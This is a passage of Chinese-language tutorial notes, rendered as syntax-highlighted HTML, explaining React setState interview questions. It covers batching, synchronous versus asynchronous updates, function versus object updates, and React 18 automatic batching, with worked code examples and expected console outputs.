  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
  <span class="token comment">// 第 2 次 log</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> 
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
    <span class="token comment">// 第 3 次 log</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
    <span class="token comment">// 第 4 次 log</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">null</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 答案</span>
<span class="token number">0</span>
<span class="token number">0</span>
<span class="token number">2</span>
<span class="token number">3</span>
</code></pre></div><ul><li><strong>关于setState的两个考点</strong> <ul><li>同步或异步</li> <li><code>state</code>合并或不合并
<ul><li><code>setState</code>传入函数不会合并覆盖</li> <li><code>setState</code>传入对象会合并覆盖<code>Object.assigin({})</code></li></ul></li></ul></li> <li>分析
<ul><li><strong>默认情况</strong> <ul><li><code>state</code>默认异步更新</li> <li><code>state</code>默认合并后更新（后面的覆盖前面的，多次重复执行不会累加）</li></ul></li> <li><code>setState</code>在合成事件和生命周期钩子中，是异步更新的</li> <li><strong>react同步更新，不在react上下文中触发</strong> <ul><li>在<code>原生事件</code>、<code>setTimeout</code>、<code>setInterval</code>、<code>promise.then</code>、<code>Ajax</code>回调中，<code>setState</code>是同步的，可以马上获取更新后的值
<ul><li>原生事件如<code>document.getElementById('test').addEventListener('click',()=&gt;{this.setState({count:this.state.count + 1}})</code></li></ul></li> <li>原因: 原生事件是浏览器本身的实现，与事务流无关，自然是同步；而<code>setTimeout</code>是放置于定时器线程中延后执行，此时事务流已结束，因此也是同步</li></ul></li> <li><strong>注意：在react18中不一样</strong> <ul><li>上述场景，在<code>react18</code>中可以异步更新（<code>Auto Batch</code>）</li> <li>需将<code>ReactDOM.render</code>替换为<code>ReactDOM.createRoot</code></li></ul></li></ul></li></ul> <blockquote><p>如需要实时获取结果，在回调函数中获取 <code>setState({count:this.state.count + 1},()=&gt;console.log(this.state.count)})</code></p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// setState原理模拟</span>
<span class="token keyword">let</span> isBatchingUpdate <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> state <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">setState</span><span class="token punctuation">(</span><span class="token parameter">newSate</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token comment">//state={...state,...newSate}</span>
  <span class="token comment">// setState异步更新</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>isBatchingUpdate<span class="token punctuation">)</span><span class="token punctuation">{</span>
    queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newSate<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token comment">// setState同步更新</span>
    state<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">...</span>state<span class="token punctuation">,</span><span class="token operator">...</span>newSate<span class="token punctuation">}</span>
  <span class="token punctuation">}</span>   
<span class="token punctuation">}</span>

<span class="token comment">// react事件是合成事件，在合成事件中isBatchingUpdate需要设置为true</span>
<span class="token comment">// 模拟react中事件点击</span>
<span class="token keyword">function</span> <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  isBatchingUpdate<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 批量更新标志</span>

  <span class="token comment">/**我们自己逻辑开始 */</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span>state<span class="token punctuation">.</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span>state<span class="token punctuation">.</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span>state<span class="token punctuation">.</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  <span class="token comment">/**我们自己逻辑结束 */</span>

  state<span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">newState<span class="token punctuation">,</span>action</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token operator">...</span>newState<span class="token punctuation">,</span><span class="token operator">...</span>action<span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
<span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// setState笔试题考察 下面这道题输出什么</span>
<span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token number">0</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// componentDidMount中isBatchingUpdate=true setState批量更新</span>
<span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// setState传入对象会合并，后面覆盖前面的Object.assign({})</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 添加到queue队列中，等待处理 </span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
  <span class="token comment">// 第 1 次 log</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 添加到queue队列中，等待处理</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
  <span class="token comment">// 第 2 次 log</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 到这里this.state.val结果等于1了</span>
    <span class="token comment">// 在原生事件和setTimeout中（isBatchingUpdate=false），setState同步更新，可以马上获取更新后的值</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 同步更新</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
    <span class="token comment">// 第 3 次 log</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 同步更新</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
    <span class="token comment">// 第 4 次 log</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">null</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 答案：0, 0, 2, 3</span>
</code></pre></div><blockquote><p>在<code>React 18</code>之前，<code>setState</code>在<code>React</code>的合成事件中是合并更新的，在<code>setTimeout</code>的原生事件中是同步按序更新的。例如</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function-variable function">handleClick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><blockquote><p>而在<code>React 18</code>中，不论是在合成事件中，还是在宏任务中，都是会合并更新</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">age</span><span class="token operator">:</span> state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> onePriority<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">age</span><span class="token operator">:</span> state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> onePriority<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">age</span><span class="token operator">:</span> state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> towPriority<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
    <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">age</span><span class="token operator">:</span> state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> towPriority<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 拓展：setState传入函数不会合并</span>
<span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token number">0</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prevState<span class="token punctuation">,</span>props</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">val</span><span class="token operator">:</span> prevState<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token comment">// 0</span>
  <span class="token comment">// 第 1 次 log</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prevState<span class="token punctuation">,</span>props</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span> <span class="token comment">// 传入函数，不会合并覆盖前面的</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">val</span><span class="token operator">:</span> prevState<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token comment">// 0</span>
  <span class="token comment">// 第 2 次 log</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// setTimeout中setState同步执行</span>
    <span class="token comment">// 到这里this.state.val结果等于2了</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> 
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token comment">// 3</span>
    <span class="token comment">// 第 3 次 log</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token comment">// 4</span>
    <span class="token comment">// 第 4 次 log</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">null</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// 答案：0 0 3 4 </span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// react hooks中打印</span>

<span class="token keyword">function</span> <span class="token function">useStateDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span> setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>

  <span class="token keyword">function</span> <span class="token function">clickHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 1.传入常量，state会合并</span>
    <span class="token function">setValue</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token function">setValue</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token comment">// 100</span>
    <span class="token comment">// 2.传入函数，state不会合并</span>
    <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token operator">=&gt;</span>value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token operator">=&gt;</span>value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token comment">// 100</span>

    <span class="token comment">// 3.setTimeout中，React18也开始合并state（之前版本会同步更新、不合并）</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      <span class="token function">setValue</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
      <span class="token function">setValue</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token comment">// 100</span>
      <span class="token function">setValue</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token comment">// 4.同理 setTimeout中，传入函数不合并</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=&gt;</span> value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
      <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=&gt;</span> value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token comment">// 100</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span>clickHandler<span class="token punctuation">}</span><span class="token operator">&gt;</span>点击 <span class="token punctuation">{</span>value<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>连环问：setState是宏任务还是微任务</strong></p> <ul><li><strong>setState本质是同步的</strong> <ul><li><code>setState</code>是同步的，不过让<code>react</code>做成异步更新的样子而已
<ul><li>如果<code>setState</code>是微任务，就不应该在<code>promise.then</code>微任务之前打印出来（<code>promise then</code>微任务先注册）</li></ul></li> <li>因为要考虑性能，多次<code>state</code>修改，只进行一次<code>DOM</code>渲染</li> <li>日常所说的“异步”是不严谨的，但沟通成本低</li></ul></li> <li><strong>总结</strong> <ul><li><code>setState</code>是同步执行，<code>state</code>都是同步更新（只是我们日常把<code>setState</code>当异步来处理）</li> <li>在微任务<code>promise.then</code>之前，<code>state</code>已经计算完了</li> <li>同步，不是微任务或宏任务</li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token number">0</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token function-variable function">clickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// react事件中 setState异步执行</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'--- start ---'</span><span class="token punctuation">)</span>

    Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise then'</span><span class="token punctuation">)</span> <span class="token comment">/* callback */</span><span class="token punctuation">)</span>

    <span class="token comment">// “异步”</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>
      <span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
